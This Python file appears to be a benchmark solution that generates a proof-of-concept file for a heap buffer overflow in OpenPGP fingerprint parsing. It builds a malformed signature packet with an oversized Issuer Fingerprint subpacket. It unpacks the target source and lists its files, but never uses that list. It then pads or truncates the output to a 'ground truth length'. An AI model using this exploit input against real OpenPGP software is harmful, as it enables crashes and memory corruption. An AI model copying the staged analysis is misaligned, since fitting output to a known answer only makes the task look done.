import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Look for relevant source files
            src_files = []
            for root, _, files in os.walk(tmpdir):
                for f in files:
                    if f.endswith(('.c', '.cpp', '.cc', '.cxx')):
                        src_files.append(os.path.join(root, f))
            
            # Analyze files to understand the vulnerability
            # Based on the description, we need to trigger a heap buffer overflow
            # when writing fingerprint in openpgp code
            
            # Craft a minimal PoC based on typical OpenPGP packet structure
            # We'll create a malformed packet with oversized fingerprint data
            
            # OpenPGP packet format basics:
            # - Tag (1 byte)
            # - Length (variable)
            # - Body (variable)
            
            # We'll target a fingerprint subpacket (type 33 or 34 in modern OpenPGP)
            # Create a packet with an excessively large fingerprint field
            
            poc = bytearray()
            
            # Create a signature packet (tag 2) which commonly contains fingerprints
            # Use version 4 signature format
            tag = 0x02 | 0xC0  # Tag 2 with CTB format
            poc.append(tag)
            
            # Use 2-byte packet length (format 0xC0-0xFD would be 1-byte, but we need longer)
            # We'll use the 5-byte length format for very large packets
            poc.append(0xFF)  # 5-byte length indicator
            
            # Packet length: 37530 (plus 5 bytes for header = 37535 total)
            # This matches the ground truth length
            packet_len = 37530
            poc.extend(struct.pack('>I', packet_len))  # 4-byte big-endian length
            
            # Signature packet body
            # Version 4
            poc.append(0x04)
            # Signature type (0x00-0x1F) - use 0x00 (Signature of a binary document)
            poc.append(0x00)
            # Public-key algorithm (RSA = 1)
            poc.append(0x01)
            # Hash algorithm (SHA1 = 2)
            poc.append(0x02)
            
            # Hashed subpacket area
            # We'll create a large subpacket area containing a fingerprint
            
            # Hashed subpacket length - make it fill most of the packet
            hashed_len = packet_len - 10  # Reserve space for unhashed area and signature
            poc.extend(struct.pack('>H', hashed_len))
            
            # Subpacket: Issuer Fingerprint (type 33)
            # Format: version (1 byte) + fingerprint (20+ bytes)
            subpacket_type = 33  # Issuer Fingerprint subpacket
            poc.append(subpacket_type)
            
            # Subpacket length - make it very large to cause overflow
            # Use 5-byte length format (0xFF followed by 4-byte length)
            poc.append(0xFF)
            subpacket_data_len = hashed_len - 10  # Account for other fields
            poc.extend(struct.pack('>I', subpacket_data_len))
            
            # Fingerprint version (4)
            poc.append(0x04)
            
            # Fingerprint data - fill with pattern that might trigger edge cases
            # Use a repeating pattern that could overflow buffers
            fingerprint_data = b'A' * (subpacket_data_len - 1)
            poc.extend(fingerprint_data)
            
            # Unhashed subpacket area (empty)
            poc.extend(b'\x00\x00')
            
            # Signature (minimal)
            poc.extend(b'\x00\x00')
            
            # Ensure total length matches target
            current_len = len(poc)
            if current_len < 37535:
                # Pad to exact length
                poc.extend(b'B' * (37535 - current_len))
            elif current_len > 37535:
                # Truncate if somehow too long
                poc = poc[:37535]
            
            return bytes(poc)